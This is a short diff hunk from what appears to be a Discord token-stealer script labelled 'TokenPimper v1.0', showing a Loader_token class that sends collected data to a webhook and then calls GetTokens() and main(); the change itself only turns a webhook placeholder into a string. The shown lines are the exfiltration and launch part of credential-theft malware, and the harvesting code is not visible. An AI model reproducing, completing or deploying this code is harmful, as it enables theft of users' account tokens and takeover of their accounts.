@@ -174,6 +174,6 @@ class Loader_token():
             except:pass        
         requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": "","embeds": embeds,"username": "TokenPimper v1.0 ","avatar_url": "https://cdn.discordapp.com/attachments/1119697039203242074/1177554398436663326/tgm_ai_redlinekodlogo.png?ex=6572edfe&is=656078fe&hm=270883a555fde4bec2760c832a7761c225687e54bb8fc0c2899c8855931ac191&"}).encode())
         
-Sender_token = Loader_token({your_hook})
+Sender_token = Loader_token("your_hook")
 Sender_token.GetTokens()
 Sender_token.main()
